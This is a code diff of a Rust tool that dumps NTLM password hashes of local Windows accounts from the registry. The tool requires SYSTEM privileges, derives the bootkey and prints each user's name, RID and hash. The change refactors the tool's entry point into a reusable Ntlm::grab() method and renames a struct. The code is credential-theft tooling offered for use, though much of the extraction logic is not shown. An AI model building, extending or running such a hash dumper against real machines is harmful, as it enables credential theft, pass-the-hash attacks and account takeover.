@@ -45,13 +45,29 @@ use block_modes::block_padding::NoPadding;
 
 type Aes128Cbc = Cbc<Aes128, NoPadding>;
 
-pub struct NTLM {
+pub struct Ntlm {
     username: String,
     rid: usize,
     hash: String
 }
 
-//https://github.com/tobiohlala/NTLMX/blob/master/NTLMX.psm1
+impl Ntlm {
+    pub fn grab() -> Result<()> {
+        println!("[?] Please make sure to run this program as SYSTEM");
+        if !check_if_system() {
+            println!("[-] Program not running as SYSTEM");
+            std::process::exit(0);
+        }
+        println!("[+] Program is running as SYSTEM\n");
+
+        if let Ok(ntlms) = get_ntlm_hash() {
+            for ntlm in ntlms {
+                println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
+            }
+        } 
+        Ok(())
+    }
+}
 
 fn get_bootkey(input: String) -> Result<Vec<u8>> {
     let mut bootkey = vec![];
@@ -120,23 +136,6 @@ fn convert_string(input: &[u8]) -> String {
         write!(s, "{:02X}", byte).unwrap();
     }
     s
-}
-
-fn main() -> Result<()> {
-    println!("[?] Please make sure to run this program as SYSTEM");
-    if !check_if_system() {
-        println!("[-] Program not running as SYSTEM");
-        std::process::exit(0);
-    }
-    println!("[+] Program is running as SYSTEM\n");
-
-    if let Ok(ntlms) = get_ntlm_hash() {
-        for ntlm in ntlms {
-            println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
-        }
-    } 
-    println!("");
-    Ok(())
 }
 
 fn get_users() -> Result<Vec<String>> {
@@ -262,8 +261,8 @@ fn to_rid(input: String) -> usize {
     return 0;
 }
 
-fn transform_to_struct(username: String, rid: usize, hash: String) -> NTLM {
-    NTLM {
+fn transform_to_struct(username: String, rid: usize, hash: String) -> Ntlm {
+    Ntlm {
         username: username,
         rid: rid,
         hash: hash,
@@ -336,9 +335,9 @@ fn bitshift(input: f64, power: i32) -> f64 {
     return (input * 2_f64.powi(power)).floor();
 }
 
-fn get_ntlm_hash() -> Result<Vec<NTLM>> {
+fn get_ntlm_hash() -> Result<Vec<Ntlm>> {
 
-    let mut hashes: Vec<NTLM> = vec![];
+    let mut hashes: Vec<Ntlm> = vec![];
 
     if let Ok(users) = get_users() {
         for user in users {
